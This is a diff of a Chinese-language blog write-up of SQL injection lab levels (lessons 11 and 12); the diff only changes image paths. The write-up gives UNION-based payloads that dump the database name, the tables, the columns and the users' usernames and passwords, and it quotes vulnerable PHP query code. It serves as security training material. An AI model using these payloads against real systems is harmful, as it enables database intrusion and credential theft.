@@ -68,24 +68,24 @@ Q,">
 <h4 id="一-爆库"><a href="#一-爆库" class="headerlink" title="一.爆库"></a>一.爆库</h4><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/lesson11-16/1.png" alt="1"></p>
+<p>得：<img src="/2021/01/30/lesson11-16/1.png" alt="1"></p>
 <h4 id="二-爆表"><a href="#二-爆表" class="headerlink" title="二.爆表"></a>二.爆表</h4><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/lesson11-16/2.png" alt="2"></p>
+<p>得：<img src="/2021/01/30/lesson11-16/2.png" alt="2"></p>
 <h4 id="三-爆列"><a href="#三-爆列" class="headerlink" title="三.爆列"></a>三.爆列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/lesson11-16/3.png" alt="3"></p>
+<p>得：<img src="/2021/01/30/lesson11-16/3.png" alt="3"></p>
 <h4 id="四-爆值"><a href="#四-爆值" class="headerlink" title="四.爆值"></a>四.爆值</h4><p>输入：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>), (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>得：<img src="/lesson11-16/4.png" alt="4"></p>
+<p>得：<img src="/2021/01/30/lesson11-16/4.png" alt="4"></p>
 <h1 id="lesson12："><a href="#lesson12：" class="headerlink" title="lesson12："></a>lesson12：</h1><p>lesson12的源码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; </span><br><span class="line">@$sql=&quot;<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=($uname) <span class="keyword">and</span> <span class="keyword">password</span>=     ($passwd) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
 
 <p>查看源代码不是很能直观看出数据库如何闭合函数，我们通过网页检测其是如何闭合参数的：</p>
 <p>username=a’a”a’)a</p>
-<p>得：<img src="/lesson11-16/5.png" alt="5"></p>
+<p>得：<img src="/2021/01/30/lesson11-16/5.png" alt="5"></p>
 <p>我们通过观察password部分可知注入点为‘’）；</p>
 <p>但是当我构造payload：root‘’）#时我发现页面返回错误，而且我发现这关无法通过注释达到篡改数据库。</p>
 <p>剩下的和lesson11一样。</p>
